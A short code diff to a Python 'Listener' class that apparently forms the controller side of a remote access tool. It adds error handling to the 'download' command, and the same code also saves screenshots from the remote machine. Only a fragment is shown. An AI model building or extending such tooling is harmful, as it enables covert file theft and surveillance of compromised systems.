@@ -63,7 +63,10 @@ class Listener:
 
 				if command.split()[0] == "download":
 					file_name = command.replace("download ", "")
-					self.write_file(file_name, result)
+					if result != False:
+						self.write_file(file_name, result)
+					else:
+						print("[-] Check your command")
 				elif command.split()[0] == "screenshot":
 					self.write_file(f"screen_{self.src_count}.png", result)
 					self.src_count += 1
